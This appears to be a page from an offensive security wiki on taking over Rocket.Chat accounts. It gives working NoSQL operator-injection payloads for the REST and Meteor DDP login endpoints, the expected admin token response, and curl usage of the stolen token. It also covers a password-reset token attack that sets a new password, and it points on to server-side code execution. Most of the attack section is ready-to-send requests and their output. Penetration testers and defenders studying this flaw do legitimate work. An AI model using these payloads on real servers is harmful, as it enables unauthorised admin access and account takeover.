---
title: "Authentication"
description: "The Rocket.Chat NoSQL operator-injection login bypass: POST /api/v1/login and the Meteor login method accept an object where a string is expected, so a MongoDB operator such as {\"$regex\":\"admin\"} or {\"$gt\":\"\"} injected into user or password matches an account without the real password and returns an authToken and userId. Covers the password-reset token weakness. Worked curl sending the operator-object payload and interpretation, feeding the token to the API and admin chain."
keywords:
  - rocket.chat login bypass
  - nosql injection
  - mongodb operator injection
  - authtoken
  - meteor login
---

# Authentication

Rocket.Chat's authentication runs on Meteor's accounts system over MongoDB, and the historic signature flaw is a NoSQL operator injection: the `login` entry point builds a Mongo query from the submitted `user` and `password` fields, and on affected builds it does not force those fields to be strings. Submit a JSON object containing a Mongo query operator instead of a string, and the query matches an account (or verifies a password hash) without you knowing the real value, returning a full session. The same primitive appears at the REST `POST /api/v1/login` and at the Meteor DDP `login` method.

## The injection point

A normal login posts strings:

```json
{"user":"admin","password":"hunter2"}
```

The attack replaces a string with an object whose key is a Mongo operator. Because the backend interpolates the field into a query document, `{"$regex":"adm"}` becomes a pattern match over usernames and `{"$gt":""}` matches any non-empty value, so the query resolves to a real account regardless of the password supplied:

```http
POST /api/v1/login HTTP/1.1
Host: target:3000
Content-Type: application/json

{"user":{"$regex":"admin","$options":"i"},"password":{"$gt":""}}
```

```text
{"status":"success","data":{"userId":"rocketcat...","authToken":"Zx9...","me":{"username":"admin","roles":["admin"]}}}
```

Interpret the response: `status":"success"` with a `data.authToken` and a `me.roles` array containing `admin` is a full admin session won without the password. A `401`/`unauthorized` means that build string-coerces the field and is not injectable through REST; try the DDP method next. Anchor the regex (`"^admin$"`) when you know the exact target username from [enumeration](enumeration.md), so you land on the intended account rather than the first alphabetical match.

## Over the Meteor DDP method

Where REST is patched or proxied, the same object reaches the login resolver through the websocket method call, which some builds validate differently:

```json
{"msg":"method","method":"login","params":[{"user":{"$regex":"admin"},"password":{"$gt":""}}],"id":"1"}
```

The `result` frame returns `{"id":"<userId>","token":"<authToken>"}`. Feed those into the REST `X-Auth-Token`/`X-User-Id` headers for everything else; the two surfaces share the session store.

## Using the token

```bash
curl -sk -H "X-Auth-Token: Zx9..." -H "X-User-Id: rocketcat..." \
  http://<target>:3000/api/v1/me | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["username"],d["roles"])'
#   admin ['admin']     confirms the token is admin
```

## Password-reset token weakness

Where the login object is coerced to a string and the bypass is dead, the account-recovery flow is the fallback. `POST /api/v1/users.forgotPassword` issues a reset token mailed to the user; on builds where that token is generated from weak or time-seeded material rather than a CSPRNG, the token is guessable within a predictable window, and `/api/v1/users.resetPassword` (or the web reset form consuming the same token) then sets a new password without inbox access:

```http
POST /api/v1/users.resetPassword HTTP/1.1
Host: target:3000
Content-Type: application/json

{"token":"<reset-token>","newPassword":"Owned-Passw0rd!"}
```

A `200`/`success` means the password is changed; log in normally to take the account.

## Follow-on

An admin `authToken`/`userId` pair is the whole game: it unlocks the admin-only integration-script feature that runs server-side JavaScript, which is the code-execution route in [server exploitation](server-exploitation.md). A non-admin token still reads the directory and channels in [enumeration](enumeration.md) and is a foothold to pivot from.

## Tools

- [RocketChat/Rocket.Chat (server source, to read the login resolver per build)](https://github.com/RocketChat/Rocket.Chat)
- `wscat`/`websocat` for the DDP `login` method variant.
- [NoSQLMap / nosqli for automating operator-injection discovery](https://github.com/codingo/NoSQLMap)

## References

- [Rocket.Chat API: login](https://developer.rocket.chat/apidocs/login)
- [OWASP Testing Guide: testing for NoSQL injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
- [PortSwigger: NoSQL injection](https://portswigger.net/web-security/nosql-injection)
